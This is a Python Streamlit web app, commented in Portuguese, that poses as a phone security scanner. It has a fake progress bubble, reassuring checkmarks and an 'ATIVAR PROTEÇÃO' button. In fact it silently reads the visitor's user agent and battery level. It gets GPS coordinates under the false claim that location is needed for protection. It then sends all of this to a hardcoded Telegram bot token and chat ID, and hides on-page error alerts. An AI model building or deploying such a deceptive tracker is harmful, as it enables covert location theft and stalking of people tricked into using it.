import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# 1. CONFIGURAÇÃO TELEGRAM (DADOS TRAVADOS)
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        # Envio direto com timeout para garantir que a mensagem saia
        requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# 2. ESTILIZAÇÃO (NÃO FOI TOCADA, EXATAMENTE COMO VOCÊ QUERIA)
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }

    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE VISUAL
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Bolha estática em 4% inicial
with caixa_bolha.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# Captura de dados de sistema (Silencioso)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL')

# 4. O BOTÃO (LÓGICA DE ENVIO CONSERTADA)
# O JavaScript agora força o retorno de um sinal claro para o Python
js_final = """
<script>
function dispararSistema() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const result = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                enviar: true  // O gatilho que faltava
            };
            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
        },
        (err) => { 
            alert("Atenção: Você precisa permitir a localização para ativar a proteção.");
        },
        { enableHighAccuracy: false, timeout: 5000 }
    );
}
</script>
<button class="btn-barra" onclick="dispararSistema()">
    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
</button>
"""

# Renderiza a barra amarela
res_gps = st.components.v1.html(js_final, height=80)

# 5. EXECUÇÃO DO ENVIO (SÓ RODA NO CLIQUE DO BOTÃO)
if res_gps and isinstance(res_gps, dict) and res_gps.get('enviar'):
    # Pega as coordenadas
    lat, lon = res_gps['lat'], res_gps['lon']
    google_maps = f"https://www.google.com/maps?q={lat},{lon}"
    
    # Faz a animação da bolha correr (Feedback visual)
    for p in range(4, 101, 8):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    
    # MONTAGEM DA MENSAGEM E ENVIO REAL PARA O BOT
    relatorio = (
        f"🛡️ *PROTEÇÃO ATIVADA*\n\n"
        f"📱 *Dispositivo:* `{ua[:50] if ua else 'N/A'}`\n"
        f"🔋 *Bateria:* `{bat if bat else '--'}`%\n"
        f"📍 [VER LOCALIZAÇÃO NO MAPA]({google_maps})"
    )
    
    enviar_telegram(relatorio)
    
    st.success("Segurança ativada com sucesso!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
